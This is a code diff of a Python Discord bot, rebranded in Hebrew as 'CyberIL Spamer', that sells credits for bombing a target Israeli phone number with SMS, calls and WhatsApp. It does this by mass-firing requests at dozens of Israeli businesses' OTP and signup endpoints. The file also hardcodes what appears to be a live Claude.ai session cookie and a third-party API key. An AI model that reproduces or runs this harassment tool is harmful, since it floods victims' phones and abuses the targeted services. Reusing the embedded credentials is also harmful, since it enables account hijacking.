@@ -15,14 +15,14 @@ import os
 from datetime import datetime, timezone
 import certifi
 
-# ─── Config ───────────────────────────────────────────────────────────────────
+# ─── הגדרות ───────────────────────────────────────────────────────────────────
 
 TOKEN = os.getenv("DISCORD_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
 DB_NAME = "my_app_db"
 
 REQUIRED_GUILD_ID = int(os.getenv("CLIENT_ID", "1474108763135938563"))
-INVITE_LINK = "https://discord.gg/MtD9NB9j45"
+INVITE_LINK = "https://discord.gg/3CxwPGuGyq"
 
 CHANNELS = {
     "PANEL": 1481957038241353779,
@@ -33,8 +33,8 @@ FREE_CREDITS_CHANNEL = 1485104425625325709
 BOMB_AUTO_CHANNEL = 1481957038241353779
 INFO_CHANNEL = 1478206395420643539
 
-ALLOWED_ROLE_ID = 1474109000889929864
-BUY_URL = "https://vougepayment.xyz/"
+ALLOWED_ROLE_ID = 1480762750052601886
+BUY_URL = ""
 
 COOLDOWN_SECONDS = 20
 ROUNDS_PER_CREDIT = 3
@@ -48,7 +48,7 @@ ORANGE_RED = 0xFF4500
 
 TOTAL_SERVICES = 88
 
-# --- Cookies ---
+# --- עוגיות ---
 CLAUDE_COOKIE = "activitySessionId=8e5e644c-d640-4b9f-be61-59b9a138a42b; anthropic-device-id=4ed16e2b-8252-4456-8e7a-e466ede65652; _fbp=fb.1.1773186995656.51415631283246056; app-shell-mode=gate-disabled; CH-prefers-color-scheme=light; __ssid=aac9d1c5-0950-4438-b7ea-a89a1639d015; cookie_seed_done=1; intercom-device-id-lupk8zyo=f68271ce-ab05-40b7-b143-901ad283a161; user-sidebar-visible-on-load=true; user-recents-collapsed=false; user-sidebar-pinned=true; g_state={\"i_l\":0,\"i_ll\":1773414635601,\"i_b\":\"y3RrxvHpC/63IgqxQoW+FkAztdzRlQfKqrSCo5paIW4\",\"i_e\":{\"enable_itp_optimization\":0},\"i_t\":1773501035602}; __cf_bm=3VjDxw6wkQm2wlbHFDvk8MaDT_DB6R36F4R.MVnz0p4-1773447632-1.0.1.1-6q05RiFdtxB27W.Dlk8sZzMKN2_GWuJqrNh03eIFieCaneWW7KiQJxVTVTNIxcxA4EeiLytjTSnQLzFe5XvedaBVzIzDp_EoeqS.drKNHic; _cfuvid=zbw_U3cChwMfKZyPfROexrLBbuzQTKW2FW6ko.UebTU-1773447632362-0.0.1.1-604800000; __stripe_mid=eabdbe50-cd60-4100-9f89-6403dde971eb6b036c; __stripe_sid=7b2497e5-5647-4528-aa38-9272e68de8c5289f41; sessionKey=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; lastActiveOrg=2b096853-0284-4d04-8bee-d3d6eb9ec7b1; cf_clearance=CM9MGR4oytc4fDuAdMWrgtGLrwjHrZfyGjDHQmELKWs-1773447692-1.2.1.1-8qu2TBglm35vOa3Y5dwU3Ue0D7gBkTfD20EtG9u.GXPEkWyTnnSOlsalbwktHG1lj9TvVOnuD19OeZaXbAIFnPMBAT3VnNkt2Rg5J8MQ9qAXN3Wf3DwDbPI.qiNUmVZwwvjmHdyRkI.fuz248__ESMWvCdMkeASIwHP7DT5e14INWZ3.iSxdKpFmZwoKzVGj1ge2Bba07dhQbqnbXVM1J7Ov4yMposOalAOKdx7hZN4; ajs_user_id=34d05785-fcf5-4298-8314-ac95766337ff; ajs_anonymous_id=64ed414c-6982-4d71-803f-2241e4e9546a; intercom-session-lupk8zyo=QTJuM3pjOVY3bWs1Njc4T0ZBQlZ1T2V6OUx0bjREempveE5JalZsR0FNMEpZYjdXZ3BYUE83WnhxYXV4S0tZSTdORlluTUc2OE14UnVCRHhBcjlzdE42SFo1ZW1NK1hWeEtZeTA0Y0hYYzlvcTN0RlBCa2YxV3JRbGJHM1B4WFltZVNNWk1QUXhWMzBEclNvUFphUTZNNTV0dk12T2s5QzhYSGN2U0pkeWNHM2NSOEZyMUU3amxwU2N5MGc4VkRpVEFZS0JrQzF3MFUyc2pzZlJyV0lTdXlDNncvYUYzcjQ1UkRkbzdmRTA1MnhiSHliZSt0akc2NjBzdjUyV2VwVkNQZ3ptd09xRzZZOTJMMXZEUzFVNmxxb3RTNG1ZYWs1K3Y5RFBTQXhiM1k9LS1YdEp3STBsUkF2S2FWSFptb29sYzFnPT0=--94e9f81d682285fead0655379f59452a0e43ab83; routingHint=sk-ant-rh-eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJFUzI1NiIsICJraWQiOiAiN0MxcWFPRnhqdWxaUjRFQnNuNk1UeUZGNWdDV2JHbFpNVDR2RklrRFFpbyJ9.eyJzdWIiOiAiMzRkMDU3ODUtZmNmNS00Mjk4LTgzMTQtYWM5NTc2NjMzN2ZmIiwgImlhdCI6IDE3NzM0NDc2OTYsICJpc3MiOiAiY2xhdWRlLWFpLXJvdXRpbmciLCAib25ib2FyZGluZ19jb21wbGV0ZSI6IHRydWUsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAiYWdlX3ZlcmlmaWVkIjogdHJ1ZSwgImxvY2FsZSI6ICJlbi1VUyJ9.yRj_WgY7-XZbfW8XvjAb8ybkDmv2wDhrNH2WqAywFX2DVfMGZayA92Tj5WJwB3-kcV2JC3Un2eERG-bLEPQlAw; _gcl_au=1.1.357471279.1773367551.67089487.1773447650.1773447710; _dd_s=aid=631a5dba-fcfc-4e29-854f-58b2ec36a49d&rum=0&expire=1773448656835"
 
 intents = discord.Intents.default()
@@ -69,7 +69,7 @@ logging.basicConfig(level=logging.WARNING)
 active_attacks: dict[int, asyncio.Event] = {}
 _launch_cooldowns: dict[int, float] = {}
 
-# ─── Random User Agents ───────────────────────────────────────────────────────
+# ─── סוכני משתמש אקראיים ───────────────────────────────────────────────────────
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
@@ -84,7 +84,7 @@ USER_AGENTS = [
 def random_ua():
     return random.choice(USER_AGENTS)
 
-# ─── MongoDB Async helpers ────────────────────────────────────────────────────
+# ─── פונקציות עזר MongoDB ────────────────────────────────────────────────────
 
 async def get_credits(uid: int) -> int:
     doc = await credits_col.find_one({"_id": uid})
@@ -98,7 +98,7 @@ async def has_lifetime(uid: int) -> bool:
 
 async def get_balance_display(uid: int) -> str:
     if await has_lifetime(uid):
-        return "Lifetime"
+        return "ללא הגבלה"
     return str(await get_credits(uid))
 
 async def add_credits(uid: int, amount: int):
@@ -132,7 +132,7 @@ async def set_cooldown(phone: str):
 def is_admin(interaction: discord.Interaction) -> bool:
     return ALLOWED_ROLE_ID in [r.id for r in interaction.user.roles]
 
-# ─── HTTP Engine ──────────────────────────────────────────────────────────────
+# ─── מנוע HTTP ──────────────────────────────────────────────────────────────
 
 async def _async_req(session: aiohttp.ClientSession, method: str, url: str,
                      data=None, json_body=None, extra_headers=None, label="") -> tuple[bool, str, str]:
@@ -251,7 +251,7 @@ async def _oshioshi(session, phone) -> tuple[bool, str, str]:
             text = await resp.text()
             match = re.search(r'name="_token"\s+value="([^"]+)"', text)
             if not match:
-                return False, label, "Missing Token"
+                return False, label, "חסר טוקן"
             token = match.group(1)
         
         url = "https://delivery.oshioshi.co.il/he/auth/register-send-code"
@@ -370,9 +370,9 @@ async def fire_all_senders(phone: str) -> tuple[int, list[str]]:
             _async_req(s,"POST","https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",json_body={"phoneNumber":p,"sourceFrom":"AuthJS","isCalling":True},extra_headers=jh("https://mishloha.co.il","https://mishloha.co.il/",{"sec-fetch-site":"same-site"}),label="mishloha"),
             _async_req(s,"POST","https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp",json_body={"type":"otp","data":{"phone":p}},label="webcut"),
             _async_req(s,"POST","https://middleware.freetv.tv/api/v1/send-verification-sms",json_body={"msisdn":p},extra_headers=jh("https://freetv.tv","https://freetv.tv/"),label="freetv"),
-            _async_req(s,"POST","https://we.care.co.il/wp-admin/admin-ajax.php",data=(f"post_id=351178&form_id=7079d8dd&referer_title=Care&queried_id=351178&form_fields[name]=https://discord.gg/freespammer&form_fields[phone]={p}&form_fields[email]={rand_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form&referrer=https://we.care.co.il/"),extra_headers=fh("https://we.care.co.il","https://we.care.co.il/glasses-tor/"),label="we.care"),
-            _async_req(s,"POST","https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",data=f"MosadId=7000297&ClientName=https://discord.gg/freespammer&Phone={p}&Amount=100&Tashlumim=1",extra_headers={"Content-Type":FORM,"accept-encoding":"gzip, deflate","referer":"https://www.matara.pro/","origin":"https://www.matara.pro"},label="matara"),
-            _async_req(s,"POST","https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php",data=(f"action=otp_register&otp_phone={p}&first_name=יגאל&last_name=ראובן&email={rand_email}&date_birth=2000-11-11&approve_terms=true&approve_marketing=true"),extra_headers=fh("https://wissotzky-tlab.co.il","https://wissotzky-tlab.co.il/%D7%9E%D7%95%D7%A2%D7%93%D7%95%D7%9F-t-club/?"),label="wissotzky"),
+            _async_req(s,"POST","https://we.care.co.il/wp-admin/admin-ajax.php",data=(f"post_id=351178&form_id=7079d8dd&referer_title=Care&queried_id=351178&form_fields[name]=CyberIL Spamer&form_fields[phone]={p}&form_fields[email]={rand_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form&referrer=https://we.care.co.il/"),extra_headers=fh("https://we.care.co.il","https://we.care.co.il/glasses-tor/"),label="we.care"),
+            _async_req(s,"POST","https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",data=f"MosadId=7000297&ClientName=CyberIL Spamer&Phone={p}&Amount=100&Tashlumim=1",extra_headers={"Content-Type":FORM,"accept-encoding":"gzip, deflate","referer":"https://www.matara.pro/","origin":"https://www.matara.pro"},label="matara"),
+            _async_req(s,"POST","https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php",data=(f"action=otp_register&otp_phone={p}&first_name=Cyber&last_name=IL&email={rand_email}&date_birth=2000-11-11&approve_terms=true&approve_marketing=true"),extra_headers=fh("https://wissotzky-tlab.co.il","https://wissotzky-tlab.co.il/%D7%9E%D7%95%D7%A2%D7%93%D7%95%D7%9F-t-club/?"),label="wissotzky"),
             _async_req(s,"POST","https://clocklb.ok2go.co.il/api/v2/users/login",json_body={"phone":p},extra_headers=jh("https://clocklb.ok2go.co.il","https://clocklb.ok2go.co.il/",{"sec-fetch-site":"same-origin"}),label="ok2go"),
             _async_req(s,"POST","https://api-endpoints.histadrut.org.il/signup/send_code",json_body={"phone":p},extra_headers={"Content-Type":"application/json","accept-encoding":"gzip, deflate","origin":"https://signup.histadrut.org.il","referer":"https://signup.histadrut.org.il/","x-api-key":"480317067f32f2fd3de682472403468da507b8d023a531602274d17d727a9189","sec-fetch-site":"same-site"},label="histadrut"),
             _async_req(s,"POST","https://www.papajohns.co.il/_a/aff_otp_auth",data=f"phone={p}",extra_headers={**fh("https://www.papajohns.co.il","https://www.papajohns.co.il/"),"sec-fetch-site":"same-origin"},label="papajohns"),
@@ -425,30 +425,31 @@ async def fire_all_senders(phone: str) -> tuple[int, list[str]]:
                     
         return success, failed
 
-# ─── Panel embed ──────────────────────────────────────────────────────────────
+# ─── לוח בקרה ──────────────────────────────────────────────────────────────
 
 def panel_embed() -> discord.Embed:
     embed = discord.Embed(
-        title="Spam-Me Control Panel",
+        title="CyberIL Spamer - לוח בקרה",
         color=0x000000,
-        description=f"Use the buttons below to interact with the bot.\nFor more info go to <#{INFO_CHANNEL}>."
+        description=f"השתמש בכפתורים למטה כדי להפעיל את הבוט.\nלמידע נוסף עבור ל<#{INFO_CHANNEL}>."
     )
-    embed.add_field(name="💣 Spam Phone", value="Sending SMS & Call & Whatsapp (costs credits)", inline=False)
-    embed.add_field(name="💰 My Credits", value="Check your balance", inline=True)
-    embed.add_field(name="💳 Buy Credits", value=f"Purchase more credits via our website", inline=True)
+    embed.add_field(name="💣 ספאם לטלפון", value="שולח SMS, שיחות ו-Whatsapp (עולה קרדיטים)", inline=False)
+    embed.add_field(name="💰 הקרדיטים שלי", value="בדוק את היתרה שלך", inline=True)
+    embed.add_field(name="💳 רכישת קרדיטים", value=f"רכוש עוד קרדיטים דרך האתר שלנו", inline=True)
+    embed.set_footer(text="CyberIL Spamer © 2026")
     return embed
 
-# ─── Views ────────────────────────────────────────────────────────────────────
+# ─── תצוגות ────────────────────────────────────────────────────────────────────
 
 class StopView(discord.ui.View):
     def __init__(self, user_id: int):
         super().__init__(timeout=600)
         self.user_id = user_id
 
-    @discord.ui.button(label="🛑 Stop Spam", style=discord.ButtonStyle.danger)
+    @discord.ui.button(label="🛑 עצור ספאם", style=discord.ButtonStyle.danger)
     async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id and not is_admin(interaction):
-            await interaction.response.send_message("❌ Not your attack.", ephemeral=True)
+            await interaction.response.send_message("❌ לא ההתקפה שלך.", ephemeral=True)
             return
         ev = active_attacks.get(self.user_id)
         if ev: ev.set()
@@ -463,10 +464,10 @@ class ConfirmView(discord.ui.View):
         self.credits_cost = credits_cost
         self.user_id = user_id
 
-    @discord.ui.button(label="✅ Yes, launch", style=discord.ButtonStyle.danger)
+    @discord.ui.button(label="✅ כן, התחל", style=discord.ButtonStyle.danger)
     async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id:
-            await interaction.response.send_message("❌ Not your confirmation.", ephemeral=True)
+            await interaction.response.send_message("❌ לא האישור שלך.", ephemeral=True)
             return
         self.stop()
 
@@ -478,18 +479,18 @@ class ConfirmView(discord.ui.View):
         for _ in range(self.credits_cost):
             if not await deduct_credits(self.user_id):
                 await interaction.edit_original_response(
-                    embed=discord.Embed(title="❌ Not enough credits.", color=DARK_RED), view=None)
+                    embed=discord.Embed(title="❌ אין מספיק קרדיטים.", color=DARK_RED), view=None)
                 return
 
         stop_event = asyncio.Event()
         active_attacks[self.user_id] = stop_event
 
         embed = discord.Embed(
-            title="🚀 Spam In Progress",
-            description=f"Spaming **{self.phone}** — ~{self.credits_cost * 35}s",
+            title="🚀 ספאם בפעולה",
+            description=f"מתקיף את **{self.phone}** — ~{self.credits_cost * 35} שניות",
             color=RED
         )
-        embed.set_footer(text="Press Stop to abort.")
+        embed.set_footer(text="לחץ על עצור כדי לבטל.")
         await interaction.edit_original_response(embed=embed, view=StopView(self.user_id))
 
         try:
@@ -503,42 +504,42 @@ class ConfirmView(discord.ui.View):
 
             bal_str = await get_balance_display(self.user_id)
             final = discord.Embed(
-                title="🛑 Stopped" if stopped else "✅ Spam Complete",
+                title="🛑 נעצר" if stopped else "✅ התקפה הושלמה",
                 color=DARK_RED
             )
-            final.add_field(name="📱 Target", value=self.phone, inline=True)
-            final.add_field(name="⏱️ Duration", value=f"~{self.credits_cost * 35}s", inline=True)
-            final.add_field(name="💰 Credits left", value=bal_str, inline=True)
+            final.add_field(name="📱 יעד", value=self.phone, inline=True)
+            final.add_field(name="⏱️ משך", value=f"~{self.credits_cost * 35} שניות", inline=True)
+            final.add_field(name="💰 קרדיטים נותרים", value=bal_str, inline=True)
             
             await interaction.edit_original_response(embed=final, view=None)
 
         except Exception as e:
             active_attacks.pop(self.user_id, None)
             await interaction.edit_original_response(
-                embed=discord.Embed(title="❌ Error", description=str(e)[:180], color=DARK_RED),
+                embed=discord.Embed(title="❌ שגיאה", description=str(e)[:180], color=DARK_RED),
                 view=None
             )
 
-    @discord.ui.button(label="❌ Cancel", style=discord.ButtonStyle.secondary)
+    @discord.ui.button(label="❌ ביטול", style=discord.ButtonStyle.secondary)
     async def cancel_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id:
-            await interaction.response.send_message("❌ Not yours.", ephemeral=True)
+            await interaction.response.send_message("❌ לא שלך.", ephemeral=True)
             return
         self.stop()
         await interaction.response.edit_message(
-            embed=discord.Embed(title="❌ Cancelled", description="No credits were deducted.", color=DARK_RED),
+            embed=discord.Embed(title="❌ בוטל", description="לא נוכו קרדיטים.", color=DARK_RED),
             view=None)
 
-class LaunchModal(discord.ui.Modal, title="🚀 Start Spam"):
+class LaunchModal(discord.ui.Modal, title="🚀 התחל ספאם"):
     phone_input = discord.ui.TextInput(
-        label="Target Phone Number",
+        label="מספר טלפון",
         placeholder="054XXXXXXX",
         min_length=10, max_length=10,
         style=discord.TextStyle.short
     )
     credits_input = discord.ui.TextInput(
-        label="Credits to use (max 100)",
-        placeholder="e.g. 5",
+        label="קרדיטים לשימוש (מקסימום 100)",
+        placeholder="למשל 5",
         min_length=1, max_length=3,
         style=discord.TextStyle.short
     )
@@ -546,7 +547,7 @@ class LaunchModal(discord.ui.Modal, title="🚀 Start Spam"):
     async def on_submit(self, interaction: discord.Interaction):
         phone = self.phone_input.value.strip()
         if not re.match(r"^05[0-9]{8}$", phone):
-            await interaction.response.send_message("❌ Invalid number — must be **05XXXXXXXX**", ephemeral=True)
+            await interaction.response.send_message("❌ מספר לא חוקי — חייב להיות **05XXXXXXXX**", ephemeral=True)
             return
 
         try:
@@ -554,7 +555,7 @@ class LaunchModal(discord.ui.Modal, title="🚀 Start Spam"):
             if credits_to_use < 1 or credits_to_use > MAX_CREDITS:
                 raise ValueError
         except ValueError:
-            await interaction.response.send_message(f"❌ Must be 1–{MAX_CREDITS}.", ephemeral=True)
+            await interaction.response.send_message(f"❌ חייב להיות 1–{MAX_CREDITS}.", ephemeral=True)
             return
 
         uid = interaction.user.id
@@ -565,23 +566,23 @@ class LaunchModal(discord.ui.Modal, title="🚀 Start Spam"):
 
         if bal < credits_to_use and not has_lt:
             await interaction.response.send_message(
-                f"❌ Need **{credits_to_use}** credits | you have **{bal}**", ephemeral=True)
+                f"❌ צריך **{credits_to_use}** קרדיטים | יש לך **{bal}**", ephemeral=True)
             return
 
         on_cd, remain = await is_on_cooldown(phone)
         if on_cd:
             await interaction.response.send_message(
-                f"⏳ Number on cooldown — **{remain}s** left.", ephemeral=True)
+                f"⏳ מספר בקואלדאון — **{remain} שניות** נותרו.", ephemeral=True)
             return
 
         bal_str = await get_balance_display(uid)
         embed = discord.Embed(
-            title="⚠️ Confirm Spam",
+            title="⚠️ אשר ספאם",
             description=(
                 f"```\n"
-                f"TARGET  : {phone}\n"
-                f"DURATION: ~{credits_to_use * 35}s\n"
-                f"COST    : {credits_to_use} credit(s)  |  Balance: {bal_str}\n"
+                f"יעד     : {phone}\n"
+                f"משך     : ~{credits_to_use * 35} שניות\n"
+                f"עלות    : {credits_to_use} קרדיטים  |  יתרה: {bal_str}\n"
                 f"```"
             ),
             color=ORANGE_RED
@@ -597,19 +598,19 @@ class ControlPanelView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
         self.add_item(discord.ui.Button(
-            label="💳 Buy Credits",
+            label="💳 רכישת קרדיטים",
             style=discord.ButtonStyle.link,
             url=BUY_URL
         ))
 
-    @discord.ui.button(label="💣 Spam Phone", style=discord.ButtonStyle.danger, custom_id="cp_launch")
+    @discord.ui.button(label="💣 ספאם לטלפון", style=discord.ButtonStyle.danger, custom_id="cp_launch")
     async def launch_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         now = time.time()
         last = _launch_cooldowns.get(interaction.user.id, 0)
         if now - last < LAUNCH_COOLDOWN:
             rem = int(LAUNCH_COOLDOWN - (now - last))
             try:
-                await interaction.response.send_message(f"⏳ Cooldown — **{rem}s** left.", ephemeral=True)
+                await interaction.response.send_message(f"⏳ קואלדאון — **{rem} שניות** נותרו.", ephemeral=True)
             except discord.errors.NotFound:
                 pass
             return
@@ -619,13 +620,13 @@ class ControlPanelView(discord.ui.View):
         except discord.errors.NotFound:
             pass
 
-    @discord.ui.button(label="💰 My Credits", style=discord.ButtonStyle.primary, custom_id="cp_balance")
+    @discord.ui.button(label="💰 הקרדיטים שלי", style=discord.ButtonStyle.primary, custom_id="cp_balance")
     async def balance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         uid = interaction.user.id
         bal_str = await get_balance_display(uid)
         embed = discord.Embed(
-            title="💰 Your Balance",
-            description=f"**{bal_str}** credits",
+            title="💰 היתרה שלך",
+            description=f"**{bal_str}** קרדיטים",
             color=RED
         )
         try:
@@ -633,13 +634,13 @@ class ControlPanelView(discord.ui.View):
         except discord.errors.NotFound:
             pass
 
-# ─── Free Credits View ────────────────────────────────────────────────────────
+# ─── תצוגת קרדיטים חינמיים ────────────────────────────────────────────────────────
 
 class FreeCreditsView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="🎁 Claim 5 Credits", style=discord.ButtonStyle.danger, custom_id="free_credits_claim")
+    @discord.ui.button(label="🎁 קבל 5 קרדיטים", style=discord.ButtonStyle.danger, custom_id="free_credits_claim")
     async def claim_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         uid = interaction.user.id
         now = time.time()
@@ -654,8 +655,8 @@ class FreeCreditsView(discord.ui.View):
                 rh = int((86400 - diff) // 3600)
                 rm = int(((86400 - diff) % 3600) // 60)
                 embed = discord.Embed(
-                    title="⏳ Already claimed today",
-                    description=f"Come back in **{rh}h {rm}m**",
+                    title="⏳ כבר מימשת היום",
+                    description=f"חזור בעוד **{rh} שעות {rm} דקות**",
                     color=DARK_RED
                 )
                 await interaction.followup.send(embed=embed, ephemeral=True)
@@ -665,20 +666,20 @@ class FreeCreditsView(discord.ui.View):
         
         bal_str = await get_balance_display(uid)
         embed = discord.Embed(
-            title="🎁 +5 Credits!",
-            description=f"New balance: **{bal_str}** credits\nCome back tomorrow!",
+            title="🎁 +5 קרדיטים!",
+            description=f"יתרה חדשה: **{bal_str}** קרדיטים\nחזור מחר!",
             color=RED
         )
         await interaction.followup.send(embed=embed, ephemeral=True)
 
-# ─── on_ready ─────────────────────────────────────────────────────────────────
+# ─── אירוע התחברות ─────────────────────────────────────────────────────────────────
 
 @bot.event
 async def on_ready():
     bot.add_view(ControlPanelView())
     bot.add_view(FreeCreditsView())
     await tree.sync()
-    print(f"✅ Spam-Me Spammer online → {bot.user}")
+    print(f"✅ CyberIL Spamer התחבר → {bot.user}")
 
     await asyncio.sleep(2)
     
@@ -691,10 +692,10 @@ async def on_ready():
         free_ch = bot.get_channel(FREE_CREDITS_CHANNEL) or await bot.fetch_channel(FREE_CREDITS_CHANNEL)
         if free_ch:
             embed = discord.Embed(
-                title="🎁 Free Gift!",
+                title="🎁 מתנה חינם!",
                 description=(
-                    "Everyone can receive **5 free credits** to use on spam-me!\n\n"
-                    "Can be redeemed once every **24 hours**."
+                    "כל אחד יכול לקבל **5 קרדיטים חינם** לשימוש בספאמר!\n\n"
+                    "ניתן לממש פעם אחת כל **24 שעות**."
                 ),
                 color=0x000000
             )
@@ -702,168 +703,168 @@ async def on_ready():
             await free_ch.send(embed=embed, view=FreeCreditsView())
             
     except Exception as e:
-        print(f"Error in on_ready: {e}")
+        print(f"שגיאה בהתחברות: {e}")
 
-# ─── Slash Commands ───────────────────────────────────────────────────────────
+# ─── פקודות סלאש ───────────────────────────────────────────────────────────
 
-@tree.command(name="checkmycredit", description="Check your current balance")
-@app_commands.describe(member="User to check (leave empty for yourself)")
+@tree.command(name="בדיקהקרדיט", description="בדוק את היתרה הנוכחית שלך")
+@app_commands.describe(member="משתמש לבדיקה (השאר ריק לעצמך)")
 async def slash_credits(interaction: discord.Interaction, member: discord.Member = None):
     target = member or interaction.user
     bal_str = await get_balance_display(target.id)
     embed = discord.Embed(
-        title="💰 Credits",
-        description=f"{target.mention} — **{bal_str}** credits",
+        title="💰 קרדיטים",
+        description=f"{target.mention} — **{bal_str}** קרדיטים",
         color=RED
     )
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="addcredit", description="[ADMIN] Add credits to a user")
-@app_commands.describe(member="Target user", amount="Amount to add")
+@tree.command(name="הוספתקרדיט", description="[ADMIN] הוסף קרדיטים למשתמש")
+@app_commands.describe(member="משתמש יעד", amount="כמות להוספה")
 async def slash_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
         return
     if amount <= 0:
-        await interaction.response.send_message("❌ Must be positive.", ephemeral=True)
+        await interaction.response.send_message("❌ חייב להיות חיובי.", ephemeral=True)
         return
     await add_credits(member.id, amount)
     new_bal_str = await get_balance_display(member.id)
-    embed = discord.Embed(title="✅ Credits Added", color=RED)
-    embed.add_field(name="User", value=member.mention, inline=True)
-    embed.add_field(name="Added", value=str(amount), inline=True)
-    embed.add_field(name="Balance", value=new_bal_str, inline=True)
+    embed = discord.Embed(title="✅ קרדיטים נוספו", color=RED)
+    embed.add_field(name="משתמש", value=member.mention, inline=True)
+    embed.add_field(name="נוסף", value=str(amount), inline=True)
+    embed.add_field(name="יתרה", value=new_bal_str, inline=True)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="removecredit", description="[ADMIN] Remove credits from a user")
-@app_commands.describe(member="Target user", amount="Amount to remove")
+@tree.command(name="הסרתקרדיט", description="[ADMIN] הסר קרדיטים ממשתמש")
+@app_commands.describe(member="משתמש יעד", amount="כמות להסרה")
 async def slash_removecredit(interaction: discord.Interaction, member: discord.Member, amount: int):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
         return
     if amount <= 0:
-        await interaction.response.send_message("❌ Must be positive.", ephemeral=True)
+        await interaction.response.send_message("❌ חייב להיות חיובי.", ephemeral=True)
         return
     await remove_credits(member.id, amount)
     new_bal_str = await get_balance_display(member.id)
-    embed = discord.Embed(title="🗑️ Credits Removed", color=DARK_RED)
-    embed.add_field(name="User", value=member.mention, inline=True)
-    embed.add_field(name="Removed", value=str(amount), inline=True)
-    embed.add_field(name="Balance", value=new_bal_str, inline=True)
+    embed = discord.Embed(title="🗑️ קרדיטים הוסרו", color=DARK_RED)
+    embed.add_field(name="משתמש", value=member.mention, inline=True)
+    embed.add_field(name="הוסר", value=str(amount), inline=True)
+    embed.add_field(name="יתרה", value=new_bal_str, inline=True)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="lifetime", description="[ADMIN] Grant unlimited credits to a user")
-@app_commands.describe(member="Target user")
+@tree.command(name="ללא_הגבלה", description="[ADMIN] הענק קרדיטים ללא הגבלה למשתמש")
+@app_commands.describe(member="משתמש יעד")
 async def slash_add_lifetime(interaction: discord.Interaction, member: discord.Member):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
         return
     await interaction.response.defer()
     await set_lifetime(member.id, True)
     embed = discord.Embed(
-        title="♾️ Lifetime Granted",
-        description=f"{member.mention} now has **unlimited credits**.",
+        title="♾️ הוענק ללא הגבלה",
+        description=f"{member.mention} קיבל **קרדיטים ללא הגבלה**.",
         color=RED
     )
     await interaction.followup.send(embed=embed)
 
-@tree.command(name="removelifetime", description="[ADMIN] Remove lifetime from a user")
-@app_commands.describe(member="Target user")
+@tree.command(name="הסרללא_הגבלה", description="[ADMIN] הסר קרדיטים ללא הגבלה ממשתמש")
+@app_commands.describe(member="משתמש יעד")
 async def slash_removelifetime(interaction: discord.Interaction, member: discord.Member):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
         return
     await interaction.response.defer()
     await set_lifetime(member.id, False)
     embed = discord.Embed(
-        title="♾️ Lifetime Removed",
-        description=f"{member.mention} no longer has lifetime.",
+        title="♾️ הוסר ללא הגבלה",
+        description=f"{member.mention} כבר לא בעל קרדיטים ללא הגבלה.",
         color=DARK_RED
     )
     await interaction.followup.send(embed=embed)
 
-@tree.command(name="freecredits", description="[ADMIN] Post the free credits gift message")
+@tree.command(name="קרדיטיםחינמיים", description="[ADMIN] פרסם את הודעת הקרדיטים החינמיים")
 async def slash_freecredits(interaction: discord.Interaction):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
         return
     embed = discord.Embed(
-        title="🎁 Free Gift!",
+        title="🎁 מתנה חינם!",
         description=(
-            "Everyone can receive **5 free credits** to use on spam-me!\n\n"
-            "Can be redeemed once every **24 hours**."
+            "כל אחד יכול לקבל **5 קרדיטים חינם** לשימוש בספאמר!\n\n"
+            "ניתן לממש פעם אחת כל **24 שעות**."
         ),
         color=0x000000
     )
     await interaction.response.send_message(embed=embed, view=FreeCreditsView())
 
-@tree.command(name="giveall", description="[ADMIN] Give credits to everyone")
-@app_commands.describe(amount="Amount to give to all users")
+@tree.command(name="תןלכולם", description="[ADMIN] תן קרדיטים לכולם")
+@app_commands.describe(amount="כמות לתת לכולם")
 async def slash_giveall(interaction: discord.Interaction, amount: int):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
         return
     await interaction.response.defer(ephemeral=True)
     if amount <= 0:
-        await interaction.followup.send("❌ Must be positive.", ephemeral=True)
+        await interaction.followup.send("❌ חייב להיות חיובי.", ephemeral=True)
         return
     await credits_col.update_many({}, {"$inc": {"credits": amount}})
-    await interaction.followup.send(f"✅ Gave **{amount}** credits to everyone!", ephemeral=True)
